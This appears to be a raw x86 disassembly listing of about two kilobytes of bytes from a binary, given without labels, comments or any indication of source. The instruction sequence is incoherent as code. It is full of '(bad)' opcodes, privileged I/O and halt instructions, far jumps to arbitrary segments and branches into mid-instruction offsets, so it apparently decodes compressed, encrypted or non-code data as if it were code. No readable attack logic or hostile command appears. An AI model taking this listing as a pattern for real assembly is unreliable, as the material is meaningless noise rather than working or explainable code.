  403f9f:	stos   DWORD PTR es:[edi],eax
  403fa0:	xchg   edi,eax
  403fa1:	push   es
  403fa2:	hlt    
  403fa3:	in     eax,0x58
  403fa5:	push   esp
  403fa6:	in     al,0x5b
  403fa8:	mov    dh,0x98
  403faa:	cmp    al,0x3d
  403fac:	inc    edx
  403fad:	adc    DWORD PTR cs:[edx-0x7911bfae],ebx
  403fb4:	push   0x1b8c8cf0
  403fb9:	popa   
  403fba:	or     dl,dh
  403fbc:	popf   
  403fbd:	or     DWORD PTR [eax+0x1c],esp
  403fc0:	icebp  
  403fc1:	dec    ebx
  403fc2:	(bad)  
  403fc3:	loop   0x404009
  403fc5:	pop    edx
  403fc6:	sti    
  403fc7:	jle    0x403f9c
  403fc9:	mov    eax,fs:0x8aed6d77
  403fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fd0:	xor    DWORD PTR [ebx-0x1e89cee0],0xf57cde1c
  403fda:	jge    0x40402b
  403fdc:	test   al,0x79
  403fde:	or     DWORD PTR [edi-0x382424e7],esp
  403fe4:	jb     0x404040
  403fe6:	push   ss
  403fe7:	ret    0xdd5d
  403fea:	xchg   esp,eax
  403feb:	mov    ebx,0x8d1c93db
  403ff0:	add    eax,0xff226ab3
  403ff5:	inc    edx
  403ff6:	add    DWORD PTR [edx],edx
  403ff8:	(bad)  
  403ff9:	out    0xa9,eax
  403ffb:	cmp    dh,bl
  403ffd:	cmp    eax,0xd9eb7441
  404002:	lods   al,BYTE PTR ds:[esi]
  404003:	cli    
  404004:	cmc    
  404005:	mov    ebx,0x33743adc
  40400a:	and    DWORD PTR ds:0x97dd3b28,0x6d79c0c4
  404014:	mov    al,BYTE PTR [esi-0x6a]
  404017:	jmp    0xc018:0x41e03e96
  40401e:	lods   al,BYTE PTR ds:[esi]
  40401f:	loopne 0x404089
  404021:	repz adc ebp,DWORD PTR gs:[esi-0x60d25f00]
  404029:	lods   eax,DWORD PTR ds:[esi]
  40402a:	add    bl,ah
  40402c:	inc    ebx
  40402d:	dec    esi
  40402e:	xchg   ecx,eax
  40402f:	xor    bl,cl
  404031:	fild   WORD PTR ds:[ebx+0xd]
  404035:	mov    esp,0x5d382054
  40403a:	in     al,dx
  40403b:	jne    0x403fce
  40403d:	xor    DWORD PTR [edx+0x42a7fcb4],ebx
  404043:	mov    ebp,0x8e44a49e
  404048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40404a:	ja     0x40409b
  40404c:	popa   
  40404d:	cld    
  40404e:	ss mov ch,0x42
  404051:	jae    0x40404d
  404053:	jl     0x403ffd
  404055:	pop    ds
  404056:	cld    
  404057:	pop    ebp
  404058:	or     ebx,DWORD PTR [edx+0x31]
  40405b:	jg     0x4040af
  40405d:	aaa    
  40405e:	push   ss
  40405f:	mov    dl,0x40
  404061:	imul   BYTE PTR [ecx]
  404063:	and    eax,0x14a885cc
  404068:	or     dh,dh
  40406a:	gs int3 
  40406c:	fwait
  40406d:	je     0x4040ec
  40406f:	push   cs
  404070:	mov    ebx,0xb3e8f501
  404075:	push   es
  404076:	and    BYTE PTR [ebx+0x6a],ch
  404079:	xchg   ebp,eax
  40407a:	mov    al,ds:0x464db5ca
  40407f:	sahf   
  404080:	xchg   edi,eax
  404081:	mov    eax,ds:0x6af2f29b
  404086:	dec    esi
  404087:	loop   0x404031
  404089:	mov    ebp,edi
  40408b:	pop    esi
  40408c:	(bad)
  40408f:	or     eax,0x4d226105
  404094:	arpl   WORD PTR [ebp-0x8],di
  404097:	mov    eax,ds:0x4e44e35c
  40409c:	xchg   esp,eax
  40409d:	mov    ds:0x5c37ad24,al
  4040a2:	dec    edi
  4040a3:	lods   eax,DWORD PTR ds:[esi]
  4040a4:	stos   DWORD PTR es:[edi],eax
  4040a5:	fisub  WORD PTR [ecx+esi*1-0x7f0ba0a6]
  4040ac:	(bad)  
  4040ad:	rcr    bh,cl
  4040af:	fcomp  QWORD PTR [esp+eax*2]
  4040b2:	out    0x37,al
  4040b4:	and    DWORD PTR [esi+ebp*1-0x90859d],edx
  4040bb:	xchg   BYTE PTR [ebp+0x12],al
  4040be:	pop    edx
  4040bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040c0:	rcl    DWORD PTR [edi+0x2623d214],1
  4040c6:	inc    ebp
  4040c7:	(bad)  
  4040c9:	mov    DWORD PTR [edx+0x86e6ada],edi
  4040cf:	jle    0x4040f7
  4040d1:	fld    DWORD PTR [edi+0x7b]
  4040d4:	shl    DWORD PTR [edx],0x6a
  4040d7:	les    eax,FWORD PTR [ebx-0x4b70949c]
  4040dd:	and    DWORD PTR [ebx+0x17c20e44],ebx
  4040e3:	push   ss
  4040e4:	es dec ecx
  4040e6:	stos   BYTE PTR es:[edi],al
  4040e7:	imul   DWORD PTR [eax-0x13]
  4040ea:	imul   ecx,DWORD PTR [eax+0x12d63b97],0x17cf925c
  4040f4:	lock cli 
  4040f6:	pop    edx
  4040f7:	xchg   ebp,ebp
  4040f9:	loope  0x404097
  4040fb:	push   esp
  4040fc:	hlt    
  4040fd:	sahf   
  4040fe:	xchg   DWORD PTR [ebx+eiz*1],ebp
  404101:	mov    ebp,0x1caebf5d
  404106:	cmc    
  404107:	(bad)
  40410b:	call   0x421f:0x13650096
  404112:	pushf  
  404113:	mul    BYTE PTR [ebp+0x2748557a]
  404119:	nop
  40411a:	imul   esp,DWORD PTR [edi],0xffffffa9
  40411d:	jmp    0x40415e
  40411f:	dec    eax
  404120:	icebp  
  404121:	sub    eax,0x100d8bdd
  404126:	jl     0x40410a
  404128:	xchg   BYTE PTR [edx+edx*2+0x54],ch
  40412c:	in     eax,0xd7
  40412e:	mov    eax,ds:0x32b28c80
  404133:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404134:	mov    fs:0xbcf8a933,al
  40413a:	shr    DWORD PTR [esi-0x59],cl
  40413d:	stc    
  40413e:	dec    ecx
  40413f:	mov    esi,0x312eff0
  404144:	dec    esi
  404145:	push   cs
  404146:	(bad)  
  404147:	push   ecx
  404148:	shl    esi,cl
  40414a:	and    BYTE PTR [eax],al
  40414c:	fidiv  DWORD PTR ds:0x81aa6f14
  404152:	shl    WORD PTR [ecx+edi*2],1
  404156:	lods   al,BYTE PTR ds:[esi]
  404157:	jns    0x404154
  404159:	mov    edx,0x9fee3c36
  40415e:	inc    eax
  40415f:	dec    esi
  404160:	jge    0x40419f
  404162:	bnd jb 0x404129
  404165:	mov    al,0xe2
  404167:	aaa    
  404168:	mov    ds:0x7363b962,eax
  40416d:	mov    DWORD PTR [ebx+ebx*4],edx
  404170:	les    edi,FWORD PTR [eax+0x9]
  404173:	jle    0x40412e
  404175:	push   ds
  404176:	push   0x74
  404178:	and    BYTE PTR [ecx+0x18],dh
  40417b:	add    al,0xc5
  40417d:	sub    al,0x23
  40417f:	in     eax,0xcd
  404181:	push   0x7e06dfc3
  404186:	xchg   edx,eax
  404187:	outs   dx,DWORD PTR ds:[esi]
  404188:	dec    ebp
  404189:	dec    ebp
  40418a:	ret    
  40418b:	scas   al,BYTE PTR es:[edi]
  40418c:	xor    al,BYTE PTR [ebp-0x44]
  40418f:	in     eax,0x85
  404191:	or     al,0x88
  404193:	mov    ah,0xb1
  404195:	mov    ?,WORD PTR [edx+0x69]
  404198:	test   eax,0x9752109a
  40419d:	inc    esi
  40419e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40419f:	push   ecx
  4041a0:	pop    ss
  4041a1:	loope  0x404186
  4041a3:	sbb    BYTE PTR ds:0x8f444255,0x5c
  4041aa:	xor    bh,dl
  4041ac:	pop    ds
  4041ad:	xor    eax,0x56b55c5d
  4041b2:	dec    esp
  4041b3:	loop   0x404177
  4041b5:	dec    esi
  4041b6:	push   ebx
  4041b7:	cs dec esp
  4041b9:	xchg   BYTE PTR [ebx],al
  4041bb:	enter  0x458f,0x9d
  4041bf:	cmp    dh,bh
  4041c1:	in     al,0xe1
  4041c3:	sub    BYTE PTR [edi-0x209d54ff],bh
  4041c9:	ret    
  4041ca:	cmp    DWORD PTR [edx],edx
  4041cc:	shr    esp,1
  4041ce:	push   ax
  4041d0:	lock ins DWORD PTR es:[edi],dx
  4041d2:	add    ah,BYTE PTR [eax-0x3822e5f1]
  4041d8:	inc    ebp
  4041d9:	mov    ds:0x1444baea,eax
  4041de:	push   esp
  4041df:	fstp   TBYTE PTR [eax+0x4c8511cd]
  4041e5:	and    dl,bl
  4041e7:	mov    WORD PTR [eax+0x34],ds
  4041ea:	test   BYTE PTR [edi],cl
  4041ec:	cld    
  4041ed:	mov    ebp,0xd1c67a1c
  4041f2:	scas   eax,DWORD PTR es:[edi]
  4041f3:	into   
  4041f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041f5:	sbb    al,0x3b
  4041f7:	inc    edi
  4041f8:	xchg   edx,eax
  4041f9:	xchg   edx,eax
  4041fa:	pop    ecx
  4041fb:	mov    dl,0x17
  4041fd:	sbb    ecx,DWORD PTR [ebx]
  4041ff:	cld    
  404200:	ret    
  404201:	(bad)  
  404202:	dec    ebx
  404203:	add    bh,BYTE PTR [esi]
  404205:	aas    
  404206:	ins    DWORD PTR es:[edi],dx
  404207:	mov    eax,ds:0x57f86e04
  40420c:	or     BYTE PTR [ebx],cl
  40420e:	adc    BYTE PTR [edi],ch
  404210:	sub    bh,BYTE PTR [ecx-0x3d]
  404213:	and    bh,ch
  404215:	adc    eax,0xc72c4059
  40421a:	pop    es
  40421b:	cmp    al,0xb5
  40421d:	xchg   ebp,eax
  40421e:	pop    ecx
  40421f:	fidivr DWORD PTR [edi-0x4d]
  404222:	stos   DWORD PTR es:[edi],eax
  404223:	mov    bh,BYTE PTR ds:0x1fc433e3
  404229:	repnz mov eax,0x3e09a86f
  40422f:	mov    al,0x9e
  404231:	mov    bh,0xed
  404233:	fucomi st,st(0)
  404235:	imul   esp,edx,0x67
  404238:	aas    
  404239:	fdivr  QWORD PTR [eax*2+0x1cbef267]
  404240:	(bad)
  404243:	test   BYTE PTR [edi-0x30],al
  404246:	mov    ds:0x5794e8bb,al
  40424b:	js     0x4041f1
  40424d:	mov    ch,0x3f
  40424f:	dec    ebp
  404250:	fcomp  DWORD PTR [edi+0x3e4cf327]
  404256:	add    eax,0x62cb826a
  40425b:	xchg   edi,eax
  40425c:	test   BYTE PTR [edx],dh
  40425e:	or     edx,0xffffffd4
  404261:	pop    ecx
  404262:	hlt    
  404263:	xchg   esi,eax
  404264:	gs inc ebp
  404266:	push   esi
  404267:	sbb    DWORD PTR [esi*8-0x24b589be],esp
  40426e:	pop    ds
  40426f:	mov    eax,ds:0x91340a8c
  404274:	and    DWORD PTR [eax-0x135443bf],0x9
  40427b:	sub    ch,BYTE PTR [ebx-0x7]
  40427e:	cmc    
  40427f:	or     BYTE PTR [esi+0x4916305],0xe4
  404286:	test   al,0xd1
  404288:	lods   al,BYTE PTR ds:[esi]
  404289:	arpl   WORD PTR [ebp-0x1b],bp
  40428c:	mov    al,ds:0xd2ae6dbb
  404291:	mov    eax,ds:0xa7a0625e
  404296:	mov    cl,0xcc
  404298:	pop    ecx
  404299:	mov    bh,dl
  40429b:	add    al,0x1b
  40429d:	into   
  40429e:	mov    cl,0x62
  4042a0:	shr    BYTE PTR [ecx],1
  4042a2:	mov    bl,0x6e
  4042a4:	cmp    BYTE PTR [edx+ebp*8],ah
  4042a7:	or     BYTE PTR [edx+edx*8+0x640c65ac],dl
  4042ae:	xor    al,0x4f
  4042b0:	in     al,0xcb
  4042b2:	out    0xc1,al
  4042b4:	and    eax,0x6627aaa5
  4042b9:	out    dx,al
  4042ba:	call   0x8cd4:0x80647fe7
  4042c1:	cld    
  4042c2:	iret   
  4042c3:	sahf   
  4042c4:	push   ecx
  4042c5:	ja     0x4042e0
  4042c7:	stc    
  4042c8:	adc    ebp,eax
  4042ca:	xchg   DWORD PTR [ebx-0x47ea7bb0],ecx
  4042d0:	clc    
  4042d1:	xlat   BYTE PTR ds:[ebx]
  4042d2:	js     0x404267
  4042d4:	aam    0x71
  4042d6:	push   ebx
  4042d7:	aaa    
  4042d8:	fcom   QWORD PTR [edi+0xa93acb3]
  4042de:	push   ebx
  4042df:	jge    0x4042c8
  4042e1:	sub    eax,0xf32c59fc
  4042e6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042e8:	mov    dh,0x27
  4042ea:	jbe    0x4042c5
  4042ec:	lds    edx,FWORD PTR [edx+eiz*1]
  4042ef:	(bad)  
  4042f0:	pop    esi
  4042f1:	fld    QWORD PTR [ebp+0x4]
  4042f4:	dec    edi
  4042f5:	mov    eax,ds:0x45eed288
  4042fa:	mov    bl,0xcf
  4042fc:	xor    eax,0xd4c9bf09
  404301:	ficom  WORD PTR [ebx]
  404303:	jle    0x404330
  404305:	fiadd  DWORD PTR [esi+edx*1-0x4d]
  404309:	mov    ch,0xb2
  40430b:	mov    edx,0xbd596b39
  404310:	test   DWORD PTR [ebx],0xfe21a899
  404316:	jbe    0x4042fa
  404318:	and    cl,BYTE PTR [edi+0x5b]
  40431b:	mov    bh,0xb0
  40431d:	iret   
  40431e:	cwde   
  40431f:	dec    edi
  404320:	(bad)  
  404321:	js     0x404378
  404323:	retf   0x5112
  404326:	xor    BYTE PTR [edx+edi*2+0xdb7640b],bh
  40432d:	xor    BYTE PTR [edx-0x33a2988a],bh
  404333:	jg     0x404321
  404335:	sbb    ecx,DWORD PTR [eax+0x5c0581e4]
  40433b:	cmp    eax,ebp
  40433d:	addr16 in al,0x1c
  404340:	xchg   ebp,eax
  404341:	xor    eax,0x6b828e64
  404346:	sub    DWORD PTR [ecx-0x6f6b9f84],ecx
  40434c:	mov    al,ds:0xfabb5325
  404351:	cmp    al,0x92
  404353:	shl    ch,cl
  404355:	jl     0x404320
  404357:	scas   al,BYTE PTR es:[edi]
  404358:	ret    
  404359:	test   BYTE PTR [eax+ebx*1-0x695e85aa],ch
  404360:	int3   
  404361:	inc    esp
  404362:	out    dx,al
  404363:	ja     0x404394
  404365:	ret    0x772e
  404368:	mov    cl,0xb4
  40436a:	sub    eax,DWORD PTR [eax+0x5f83a498]
  404370:	cmp    esi,DWORD PTR [eax]
  404372:	ins    BYTE PTR es:[edi],dx
  404373:	ds stos DWORD PTR es:[edi],eax
  404375:	mov    edi,0xe18ed454
  40437a:	and    cl,BYTE PTR [ebx+0x30990fc]
  404380:	lods   eax,DWORD PTR ds:[esi]
  404381:	adc    ch,BYTE PTR [edx+0x1afa8155]
  404387:	fwait
  404388:	cmp    esp,DWORD PTR [esi-0x5ce3d68f]
  40438e:	pop    esp
  40438f:	xchg   esp,eax
  404390:	cmp    eax,0xae677e4
  404395:	inc    ecx
  404396:	adc    DWORD PTR [eax],esi
  404398:	dec    ecx
  404399:	cmp    edx,DWORD PTR [ebx+ecx*2-0x53]
  40439d:	lahf   
  40439e:	in     eax,dx
  40439f:	xor    BYTE PTR [ebx+0x7a830ca1],ah
  4043a5:	push   cs
  4043a6:	in     al,dx
  4043a7:	pop    DWORD PTR [ecx+0x57245f8e]
  4043ad:	test   eax,0x5a65f097
  4043b2:	lock push cs
  4043b4:	xchg   edx,eax
  4043b5:	dec    ebp
  4043b6:	call   0x961fd47c
  4043bb:	dec    ebp
  4043bc:	jo     0x40434e
  4043be:	sahf   
  4043bf:	leave  
  4043c0:	mov    bh,BYTE PTR [edx-0x1ba9adbc]
  4043c6:	xlat   BYTE PTR ds:[ebx]
  4043c7:	sub    al,0x87
  4043c9:	in     eax,dx
  4043ca:	push   edi
  4043cb:	call   0x24dd497d
  4043d0:	pop    ds
  4043d1:	leave  
  4043d2:	add    bl,ah
  4043d4:	mov    cl,0xbe
  4043d6:	add    al,0xd5
  4043d8:	jmp    0x40437e
  4043da:	cmc    
  4043db:	xor    bh,dl
  4043dd:	xchg   edi,eax
  4043de:	inc    eax
  4043df:	xor    BYTE PTR [esi+0x50],cl
  4043e2:	cwde   
  4043e3:	dec    ebx
  4043e4:	and    ecx,DWORD PTR [edi]
  4043e6:	inc    esp
  4043e7:	fisubr WORD PTR [eax-0x45a7a89c]
  4043ed:	ja     0x404400
  4043ef:	pop    ds
  4043f0:	push   ebp
  4043f1:	mov    ecx,0x8b93f7df
  4043f6:	cmp    eax,0xe0001b71
  4043fb:	dec    eax
  4043fc:	cmp    ebp,DWORD PTR [eax+0x227f5b68]
  404402:	jecxz  0x404425
  404404:	mov    ah,BYTE PTR [edx+0x15f18256]
  40440a:	pop    eax
  40440b:	dec    eax
  40440c:	mov    ebp,DWORD PTR [esi+0x5e]
  40440f:	jle    0x4043c1
  404411:	and    cl,BYTE PTR [edx+0x7dbdbf92]
  404417:	inc    ebp
  404418:	call   0xcc00:0xf6df315f
  40441f:	fild   DWORD PTR [esi]
  404421:	mov    ds:0xd0d31f00,al
  404426:	pushf  
  404427:	push   esp
  404428:	xor    eax,0xfbd75be1
  40442d:	inc    esp
  40442e:	add    eax,0x9b34358f
  404433:	enter  0x9757,0x11
  404437:	pop    edi
  404438:	ret    
  404439:	pop    es
  40443a:	fdiv   QWORD PTR fs:[eax-0x16]
  40443e:	call   0x1561d5b1
  404443:	cwde   
  404444:	int3   
  404445:	sbb    eax,0x6812367b
  40444a:	and    esp,esp
  40444c:	jne    0x4043fb
  40444e:	cmp    ah,BYTE PTR [edx+0x2d]
  404451:	jmp    FWORD PTR [eax+edi*8]
  404454:	push   esp
  404455:	(bad)  
  404456:	setne  BYTE PTR [esp+edx*2-0x6a]
  40445b:	mov    BYTE PTR [ebx+0x41],dh
  40445e:	jbe    0x404432
  404460:	ret    0x68df
  404463:	pop    edi
  404464:	xchg   esi,eax
  404465:	les    ecx,FWORD PTR [ecx-0x75]
  404468:	xchg   ecx,eax
  404469:	aas    
  40446a:	aad    0x62
  40446c:	cmp    eax,0xd0a64496
  404471:	add    ecx,DWORD PTR [esi]
  404473:	xchg   ecx,eax
  404474:	ins    BYTE PTR es:[edi],dx
  404475:	mov    edx,DWORD PTR [esi-0x6f]
  404478:	adc    DWORD PTR [eax+0x1e],edx
  40447b:	mov    BYTE PTR [ebp+0x3a],cl
  40447e:	xor    ebp,DWORD PTR [ecx]
  404480:	in     al,dx
  404481:	push   edi
  404482:	mov    dl,BYTE PTR [edi-0x2c]
  404485:	cli    
  404486:	dec    ecx
  404487:	or     eax,0x1aee15a1
  40448c:	mov    fs,WORD PTR [ecx]
  40448e:	and    al,ch
  404490:	mov    esp,0x30437088
  404495:	inc    eax
  404496:	inc    ebx
  404497:	in     al,0x6d
  404499:	imul   edx,DWORD PTR [ebx-0x71],0x50bfbe69
  4044a0:	cmp    esi,DWORD PTR [ebx]
  4044a2:	xchg   ebx,eax
  4044a3:	bound  ecx,QWORD PTR [ecx+edi*8+0x3d093819]
  4044aa:	xchg   esp,eax
  4044ab:	int    0x2d
  4044ad:	mov    edx,0x628d9117
  4044b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044b3:	jb     0x4044fc
  4044b5:	(bad)
  4044b8:	jae    0x4044df
  4044ba:	and    ah,dl
  4044bc:	xchg   ebp,eax
  4044bd:	clc    
  4044be:	data16 stos BYTE PTR es:[edi],al
  4044c0:	enter  0x7180,0x5e
  4044c4:	lahf   
  4044c5:	cmp    al,0x4
  4044c7:	ins    BYTE PTR es:[edi],dx
  4044c8:	mov    al,ds:0xbb139dbc
  4044cd:	xchg   ebp,eax
  4044ce:	jae    0x404464
  4044d0:	lock test DWORD PTR [eax],esi
  4044d3:	add    al,0x9b
  4044d5:	sbb    esp,edi
  4044d7:	push   edx
  4044d8:	int3   
  4044d9:	inc    ebp
  4044da:	and    esp,DWORD PTR [eax+edx*8-0x64]
  4044de:	dec    esi
  4044df:	xchg   ebx,eax
  4044e0:	iret   
  4044e1:	adc    edi,DWORD PTR [ecx]
  4044e3:	and    al,0x3f
  4044e5:	ja     0x4044ae
  4044e7:	xchg   edi,eax
  4044e8:	fdiv   st,st(1)
  4044ea:	xor    BYTE PTR [ebx],0x98
  4044ed:	mov    edi,0xa6872de0
  4044f2:	into   
  4044f3:	adc    BYTE PTR [ecx-0xa4142f],dh
  4044f9:	retf   
  4044fa:	pop    edx
  4044fb:	xor    BYTE PTR cs:[eax+0x2a],dh
  4044ff:	mov    dl,0x18
  404501:	jle    0x4044e4
  404503:	dec    esi
  404504:	mov    ah,0x86
  404506:	pop    ecx
  404507:	jmp    0x4044fc
  404509:	loop   0x40448f
  40450b:	imul   ebp,DWORD PTR [eax-0x436c6b68],0xb63a9280
  404515:	xlat   BYTE PTR ds:[ebx]
  404516:	sub    dh,BYTE PTR [esi]
  404518:	sub    ecx,DWORD PTR [eax+0x195964b9]
  40451e:	imul   edi,ebp,0xeaaedb49
  404524:	cld    
  404525:	fild   WORD PTR [ecx]
  404528:	push   ss
  404529:	mov    ds:0xa50bfc79,eax
  40452e:	clc    
  40452f:	shl    DWORD PTR [edi+0x1],0xda
  404533:	pop    ebx
  404534:	mov    ah,0x41
  404536:	xor    eax,DWORD PTR [ebx+0x7a]
  404539:	mov    dl,0xb7
  40453b:	jno    0x4044cf
  40453d:	push   ebx
  40453e:	test   BYTE PTR [esi-0xa],bl
  404541:	jecxz  0x404563
  404543:	jge    0x4044ee
  404545:	mov    esp,0x6a55f5a
  40454a:	mov    eax,ds:0xb9738bcd
  40454f:	and    DWORD PTR [eax],ecx
  404551:	(bad)  
  404552:	fist   DWORD PTR [ebx+0x3bc091a7]
  404558:	ja     0x404539
  40455a:	fs ret 0x69ef
  40455e:	imul   esp,DWORD PTR [esi-0x31],0xac6a1afe
  404565:	hlt    
  404566:	mov    ebp,0x4f6e2da8
  40456b:	mov    ds:0xd73b640,al
  404570:	jecxz  0x404564
  404572:	iret   
  404573:	clc    
  404574:	adc    esi,ebx
  404576:	xchg   esi,eax
  404577:	shl    BYTE PTR [edi+0x32],cl
  40457a:	pushf  
  40457b:	call   0x8c0fa0be
  404580:	push   esp
  404581:	loopne 0x404581
  404583:	das    
  404584:	dec    edx
  404585:	mov    edx,DWORD PTR [ecx]
  404587:	(bad)  
  404589:	stc    
  40458a:	das    
  40458b:	inc    ebx
  40458c:	cmc    
  40458d:	pushf  
  40458e:	or     DWORD PTR [eax-0x78d7d5c3],0xffffffc8
  404595:	shl    DWORD PTR [esi+0x37],1
  404598:	or     BYTE PTR [eax+0x5e72ed16],ch
  40459e:	out    0xe3,al
  4045a0:	dec    eax
  4045a1:	cmp    dh,0xad
  4045a4:	out    dx,eax
  4045a5:	in     eax,dx
  4045a6:	(bad)  
  4045a7:	iret   
  4045a8:	push   esi
  4045a9:	iret   
  4045aa:	std    
  4045ab:	fdivr  DWORD PTR [ebx+eax*1-0x36629ef7]
  4045b2:	int    0x6f
  4045b4:	jbe    0x4045a2
  4045b6:	adc    BYTE PTR [esi],0xfe
  4045b9:	ss push cs
  4045bb:	dec    ecx
  4045bc:	jmp    0x404545
  4045be:	icebp  
  4045bf:	sbb    ebx,DWORD PTR [eax-0x3a]
  4045c2:	pushf  
  4045c3:	cli    
  4045c4:	loop   0x404572
  4045c6:	jmp    0xdb24:0x6ed0709e
  4045cd:	adc    DWORD PTR [ebx-0x430e5521],ecx
  4045d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045d4:	gs sub dl,0xe5
  4045d8:	cmc    
  4045d9:	rol    BYTE PTR [ecx+ecx*1-0x1fec03cf],1
  4045e0:	jno    0x404574
  4045e2:	scas   eax,DWORD PTR es:[edi]
  4045e3:	push   ecx
  4045e4:	fnstsw WORD PTR [ecx+0x63cd1105]
  4045ea:	mov    al,0x4a
  4045ec:	pop    edi
  4045ed:	adc    edi,ecx
  4045ef:	mov    dl,0x7c
  4045f1:	clc    
  4045f2:	in     al,dx
  4045f3:	cmp    al,0xfe
  4045f5:	std    
  4045f6:	cld    
  4045f7:	mov    ecx,DWORD PTR [edx+0x75]
  4045fa:	stos   DWORD PTR es:[edi],eax
  4045fb:	or     al,0xbf
  4045fd:	aam    0xd7
  4045ff:	cmp    BYTE PTR [edx-0x4d275fa8],bl
  404605:	into   
  404606:	xlat   BYTE PTR ds:[ebx]
  404607:	nop
  404608:	push   ebp
  404609:	call   0xdf6e803b
  40460e:	inc    esp
  40460f:	xchg   ecx,eax
  404610:	fsub   DWORD PTR [edi-0x4665cac5]
  404616:	xchg   ecx,eax
  404617:	jge    0x40462e
  404619:	add    bl,BYTE PTR [ecx]
  40461b:	and    BYTE PTR [edi+0x2a],bl
  40461e:	dec    esp
  40461f:	or     esi,0x2b
  404622:	inc    ebx
  404623:	dec    DWORD PTR [esp+eax*8-0x73c3f4c3]
  40462a:	dec    ebp
  40462b:	xchg   edi,eax
  40462c:	fsub   QWORD PTR [ecx]
  40462e:	push   0x842cf946
  404633:	rcl    ebp,cl
  404635:	(bad)  
  404636:	and    edx,esp
  404638:	cdq    
  404639:	out    dx,eax
  40463a:	into   
  40463b:	dec    eax
  40463c:	adc    eax,0x16f6ee49
  404641:	cli    
  404642:	(bad)  
  404643:	sbb    al,BYTE PTR [edi]
  404645:	push   cs
  404646:	pop    ebp
  404647:	or     BYTE PTR [esi+0x16],ah
  40464a:	stos   BYTE PTR es:[edi],al
  40464b:	sub    al,0x25
  40464d:	retf   
  40464e:	push   cs
  40464f:	push   eax
  404650:	pop    ds
  404651:	ret    0x56dd
  404654:	mov    bl,0xa7
  404656:	inc    edi
  404657:	(bad)
  40465b:	lds    edi,FWORD PTR [ebp+edx*4+0x510ceaff]
  404662:	fsubrp st(6),st
  404664:	(bad)  [ebp-0x4b]
  404667:	pop    ecx
  404668:	out    dx,eax
  404669:	sbb    al,0x28
  40466b:	mov    dl,0xb6
  40466d:	test   BYTE PTR ds:0x4b44925f,0x10
  404674:	test   eax,0x3ef28122
  404679:	push   eax
  40467a:	dec    eax
  40467b:	or     esi,DWORD PTR [edi]
  40467d:	cmc    
  40467e:	into   
  40467f:	(bad)  
  404680:	jnp    0x404609
  404682:	sub    BYTE PTR [edx-0x65],ch
  404685:	fldenv fs:[eax]
  404688:	cmp    esi,DWORD PTR [esi+esi*1]
  40468b:	int3   
  40468c:	test   al,0x33
  40468e:	push   edx
  40468f:	pop    eax
  404690:	jne    0x40462e
  404692:	or     al,0x2b
  404694:	sub    eax,0xa80d5643
  404699:	push   ds
  40469a:	cmp    eax,0x9673316c
  40469f:	lds    eax,FWORD PTR [ebp+0x65451161]
  4046a5:	xchg   ebp,eax
  4046a6:	lods   al,BYTE PTR ds:[esi]
  4046a7:	int3   
  4046a8:	adc    ah,dl
  4046aa:	test   al,0x6b
  4046ac:	ss aad 0xa7
  4046af:	dec    esi
  4046b0:	and    ah,al
  4046b2:	xchg   DWORD PTR [edx],ebp
  4046b4:	out    dx,eax
  4046b5:	retf   0xf3ab
  4046b8:	or     ebx,DWORD PTR [edi+ecx*2]
  4046bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046bc:	stc    
  4046bd:	imul   DWORD PTR [ebp+0x69]
  4046c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046c1:	dec    esi
  4046c2:	mov    WORD PTR [esp+edi*8],?
  4046c5:	daa    
  4046c6:	inc    edx
  4046c7:	dec    ebp
  4046c8:	lock adc al,0xd2
  4046cb:	ret    
  4046cc:	loopne 0x4046e4
  4046ce:	inc    esi
  4046cf:	cld    
  4046d0:	fnstcw WORD PTR [edx-0x44]
  4046d3:	or     DWORD PTR [ebx],0x7f
  4046d6:	mov    ecx,0xb9a513ab
  4046db:	or     edx,ebx
  4046dd:	fadd   DWORD PTR [esi-0x40]
  4046e1:	es cld 
  4046e3:	fdiv   st(5),st
  4046e5:	jnp    0x404748
  4046e7:	push   DWORD PTR [edi]
  4046e9:	pop    ss
  4046ea:	xchg   BYTE PTR [edx],dh
  4046ec:	lea    esp,[esi]
  4046ee:	and    BYTE PTR [ecx],dh
  4046f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046f1:	mov    dl,0xab
  4046f3:	push   0xffffff96
  4046f5:	data16 cmc 
  4046f7:	std    
  4046f8:	sbb    al,0x29
  4046fa:	add    eax,0x1c21918f
  4046ff:	call   FWORD PTR [ebx-0x72]
  404702:	pop    esp
  404703:	sub    BYTE PTR [eax],al
  404705:	jns    0x4046bf
  404707:	cwde   
  404708:	xlat   BYTE PTR ds:[ebx]
  404709:	pushf  
  40470a:	pop    ecx
  40470b:	fild   DWORD PTR [ebx+0x2ab40f4a]
  404711:	dec    esi
  404712:	mov    ebp,0x234bab68
  404717:	mov    edx,0xa51ac071
  40471c:	leave  
  40471d:	jb     0x404716
  40471f:	pop    edx
  404720:	fcom   QWORD PTR [edx-0x56]
  404723:	fld    QWORD PTR [edx-0x66]
  404726:	arpl   WORD PTR [ebx+edx*4],cx
  404729:	retf   
  40472a:	xchg   ecx,eax
  40472b:	dec    edi
  40472c:	dec    esp
  40472d:	push   eax
  40472e:	jns    0x404706
  404730:	aaa    
  404731:	lods   eax,DWORD PTR ds:[esi]
  404732:	pushf  
  404733:	cmovae edx,DWORD PTR [esi+0x37401af9]
  40473a:	fisub  WORD PTR [esi+0x61a57d16]
  404740:	ins    BYTE PTR es:[edi],dx
  404741:	xchg   esp,eax
  404742:	into   
  404743:	sbb    al,0x46
  404745:	or     eax,0xdc4ed2a0
  40474a:	pop    edx
  40474b:	(bad)  
  40474c:	ficomp WORD PTR [edi-0x747f07ad]
  404752:	jecxz  0x4046fc
  404754:	fwait
  404755:	retf   
  404756:	clc    
  404757:	and    DWORD PTR [ecx+ebp*2-0x6a4edfdb],0xffffffbf
  40475f:	push   edi
  404760:	retf   
  404761:	push   ebp
  404762:	dec    ebp
  404763:	push   es
  404764:	pop    ss
  404765:	jmp    0x40473a
